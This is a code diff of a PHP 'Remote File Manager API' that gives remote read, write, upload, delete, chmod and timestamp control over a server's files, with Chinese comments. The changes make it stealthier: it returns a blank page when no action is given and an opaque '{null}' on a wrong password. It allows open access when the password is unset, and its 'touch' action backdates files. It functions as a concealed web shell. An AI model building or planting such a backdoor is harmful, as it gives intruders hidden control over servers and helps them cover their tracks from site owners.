@@ -20,58 +20,62 @@ if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
 }
 
 // 响应函数
-function response($success, $data = null, $message = '') {
-    $result = array(
+function response($success, $data, $message) {
+    echo json_encode(array(
         'success' => $success,
         'data' => $data,
         'message' => $message
-    );
-    echo json_encode($result, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
+    ));
     exit;
 }
 
-// 获取操作类型
-$action = isset($_GET['action']) ? $_GET['action'] : (isset($_POST['action']) ? $_POST['action'] : '');
-
-// 如果没有提供action，返回API信息
-if (empty($action)) {
-    response(true, array(
-        'name' => 'Remote File Manager API',
-        'version' => '1.0',
-        'status' => 'ready'
-    ), 'API运行正常，请提供action参数');
+// 获取参数
+function getParam($key, $default = '') {
+    if (isset($_GET[$key])) return $_GET[$key];
+    if (isset($_POST[$key])) return $_POST[$key];
+    return $default;
 }
 
-// 验证密码
-function checkPassword($password, $correctPassword) {
-    if (empty($correctPassword) || $correctPassword === 'your_password_here') {
-        return true; // 未设置密码时允许访问
-    }
-    return $password === $correctPassword;
+// 获取操作类型
+$action = getParam('action', '');
+
+// 如果没有提供action，返回空白
+if (empty($action)) {
+    exit;
 }
 
 // 获取密码
-$password = isset($_SERVER['HTTP_X_PASSWORD']) ? $_SERVER['HTTP_X_PASSWORD'] :
-            (isset($_POST['password']) ? $_POST['password'] :
-            (isset($_GET['password']) ? $_GET['password'] : ''));
+$password = '';
+if (isset($_SERVER['HTTP_X_PASSWORD'])) {
+    $password = $_SERVER['HTTP_X_PASSWORD'];
+} elseif (isset($_POST['password'])) {
+    $password = $_POST['password'];
+} elseif (isset($_GET['password'])) {
+    $password = $_GET['password'];
+}
 
-if (!checkPassword($password, $PASSWORD)) {
-    http_response_code(401);
-    response(false, null, '密码错误');
+// 验证密码
+if (!empty($PASSWORD) && $PASSWORD !== 'your_password_here') {
+    if ($password !== $PASSWORD) {
+        http_response_code(401);
+        echo '{null}';
+        exit;
+    }
 }
 
 // 安全路径处理
 function safePath($path) {
-    $path = str_replace(['../', '..\\'], '', $path);
+    $path = str_replace(array('../', '..\\'), '', $path);
     if (empty($path)) return '/';
     $real = realpath($path);
-    return $real ?: $path;
+    if ($real === false) return $path;
+    return $real;
 }
 
 // 格式化文件大小
 function formatSize($bytes) {
     if ($bytes == 0) return '0 B';
-    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
+    $units = array('B', 'KB', 'MB', 'GB', 'TB');
     $i = floor(log($bytes, 1024));
     return round($bytes / pow(1024, $i), 2) . ' ' . $units[$i];
 }
@@ -102,7 +106,7 @@ function getPermsString($path) {
 switch ($action) {
     // 列出目录
     case 'list':
-        $path = safePath($_GET['path'] ?? '/');
+        $path = safePath(getParam('path', '/'));
 
         if (!@is_dir($path)) {
             response(false, null, '目录不存在');
@@ -112,7 +116,7 @@ switch ($action) {
             response(false, null, '无权限读取');
         }
 
-        $items = [];
+        $items = array();
         $files = @scandir($path);
 
         if ($files === false) {
@@ -124,18 +128,23 @@ switch ($action) {
 
             $fullPath = rtrim($path, '/') . '/' . $file;
             $isDir = @is_dir($fullPath);
+            $size = 0;
+            if (!$isDir) {
+                $size = @filesize($fullPath);
+                if ($size === false) $size = 0;
+            }
 
-            $items[] = [
+            $items[] = array(
                 'name' => $file,
                 'path' => $fullPath,
                 'is_dir' => $isDir,
-                'size' => $isDir ? 0 : (@filesize($fullPath) ?: 0),
-                'size_formatted' => $isDir ? '-' : formatSize(@filesize($fullPath) ?: 0),
-                'mtime' => @filemtime($fullPath) ?: 0,
+                'size' => $size,
+                'size_formatted' => $isDir ? '-' : formatSize($size),
+                'mtime' => @filemtime($fullPath),
                 'perms' => getPermsString($fullPath),
                 'readable' => @is_readable($fullPath),
                 'writable' => @is_writable($fullPath)
-            ];
+            );
         }
 
         // 排序：目录在前
@@ -147,15 +156,15 @@ switch ($action) {
             return strcasecmp($a['name'], $b['name']);
         });
 
-        response(true, [
+        response(true, array(
             'path' => $path,
             'items' => $items
-        ]);
+        ), '');
         break;
 
     // 读取文件
     case 'read':
-        $path = safePath($_GET['path'] ?? '');
+        $path = safePath(getParam('path', ''));
 
         if (!@is_file($path)) {
             response(false, null, '文件不存在');
@@ -170,17 +179,17 @@ switch ($action) {
             response(false, null, '读取失败');
         }
 
-        response(true, [
+        response(true, array(
             'path' => $path,
             'content' => $content,
             'size' => strlen($content)
-        ]);
+        ), '');
         break;
 
     // 写入文件
     case 'write':
-        $path = $_POST['path'] ?? '';
-        $content = $_POST['content'] ?? '';
+        $path = getParam('path', '');
+        $content = isset($_POST['content']) ? $_POST['content'] : '';
 
         if (empty($path)) {
             response(false, null, '路径不能为空');
@@ -191,12 +200,12 @@ switch ($action) {
             response(false, null, '写入失败');
         }
 
-        response(true, ['bytes' => $result], '保存成功');
+        response(true, array('bytes' => $result), '保存成功');
         break;
 
     // 创建目录
     case 'mkdir':
-        $path = $_POST['path'] ?? '';
+        $path = getParam('path', '');
 
         if (empty($path)) {
             response(false, null, '路径不能为空');
@@ -215,7 +224,7 @@ switch ($action) {
 
     // 删除文件或目录
     case 'delete':
-        $path = safePath($_POST['path'] ?? '');
+        $path = safePath(getParam('path', ''));
 
         if (empty($path) || $path === '/') {
             response(false, null, '不能删除根目录');
@@ -232,11 +241,11 @@ switch ($action) {
                 if ($files === false) return false;
                 foreach ($files as $file) {
                     if ($file === '.' || $file === '..') continue;
-                    $path = $dir . '/' . $file;
-                    if (is_dir($path)) {
-                        deleteDir($path);
+                    $p = $dir . '/' . $file;
+                    if (is_dir($p)) {
+                        deleteDir($p);
                     } else {
-                        @unlink($path);
+                        @unlink($p);
                     }
                 }
                 return @rmdir($dir);
@@ -256,8 +265,8 @@ switch ($action) {
 
     // 重命名
     case 'rename':
-        $oldPath = safePath($_POST['old_path'] ?? '');
-        $newPath = $_POST['new_path'] ?? '';
+        $oldPath = safePath(getParam('old_path', ''));
+        $newPath = getParam('new_path', '');
 
         if (empty($oldPath) || empty($newPath)) {
             response(false, null, '路径不能为空');
@@ -280,7 +289,7 @@ switch ($action) {
 
     // 上传文件
     case 'upload':
-        $dir = safePath($_POST['dir'] ?? '/');
+        $dir = safePath(getParam('dir', '/'));
 
         if (!isset($_FILES['file'])) {
             response(false, null, '没有文件');
@@ -297,12 +306,12 @@ switch ($action) {
             response(false, null, '保存失败');
         }
 
-        response(true, ['path' => $targetPath], '上传成功');
+        response(true, array('path' => $targetPath), '上传成功');
         break;
 
     // 下载文件
     case 'download':
-        $path = safePath($_GET['path'] ?? '');
+        $path = safePath(getParam('path', ''));
 
         if (!@is_file($path) || !@is_readable($path)) {
             http_response_code(404);
@@ -317,8 +326,8 @@ switch ($action) {
 
     // 修改时间
     case 'touch':
-        $path = safePath($_POST['path'] ?? '');
-        $time = $_POST['time'] ?? time();
+        $path = safePath(getParam('path', ''));
+        $time = getParam('time', time());
 
         if (!@touch($path, (int)$time)) {
             response(false, null, '修改时间失败');
@@ -329,8 +338,8 @@ switch ($action) {
 
     // 修改权限
     case 'chmod':
-        $path = safePath($_POST['path'] ?? '');
-        $mode = $_POST['mode'] ?? '';
+        $path = safePath(getParam('path', ''));
+        $mode = getParam('mode', '');
 
         if (empty($mode)) {
             response(false, null, '权限不能为空');
@@ -345,42 +354,45 @@ switch ($action) {
 
     // 获取文件信息
     case 'info':
-        $path = safePath($_GET['path'] ?? '');
+        $path = safePath(getParam('path', ''));
 
         if (!@file_exists($path)) {
             response(false, null, '文件不存在');
         }
 
-        response(true, [
+        $perms = @fileperms($path);
+        $octal = $perms !== false ? substr(sprintf('%o', $perms), -4) : '????';
+
+        response(true, array(
             'path' => $path,
             'name' => basename($path),
             'is_dir' => @is_dir($path),
-            'size' => @filesize($path) ?: 0,
-            'size_formatted' => formatSize(@filesize($path) ?: 0),
-            'mtime' => @filemtime($path) ?: 0,
-            'ctime' => @filectime($path) ?: 0,
-            'atime' => @fileatime($path) ?: 0,
+            'size' => @filesize($path),
+            'size_formatted' => formatSize(@filesize($path)),
+            'mtime' => @filemtime($path),
+            'ctime' => @filectime($path),
+            'atime' => @fileatime($path),
             'perms' => getPermsString($path),
-            'perms_octal' => substr(sprintf('%o', @fileperms($path)), -4),
+            'perms_octal' => $octal,
             'readable' => @is_readable($path),
             'writable' => @is_writable($path),
             'owner' => @fileowner($path),
             'group' => @filegroup($path)
-        ]);
+        ), '');
         break;
 
     // 服务器信息
     case 'server':
-        response(true, [
+        response(true, array(
             'php_version' => phpversion(),
-            'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
-            'document_root' => $_SERVER['DOCUMENT_ROOT'] ?? '',
+            'server_software' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Unknown',
+            'document_root' => isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '',
             'script_path' => __FILE__,
             'upload_max' => ini_get('upload_max_filesize'),
             'post_max' => ini_get('post_max_size'),
-            'disk_free' => formatSize(@disk_free_space('/') ?: 0),
-            'disk_total' => formatSize(@disk_total_space('/') ?: 0)
-        ]);
+            'disk_free' => formatSize(@disk_free_space('/') ? disk_free_space('/') : 0),
+            'disk_total' => formatSize(@disk_total_space('/') ? disk_total_space('/') : 0)
+        ), '');
         break;
 
     default:
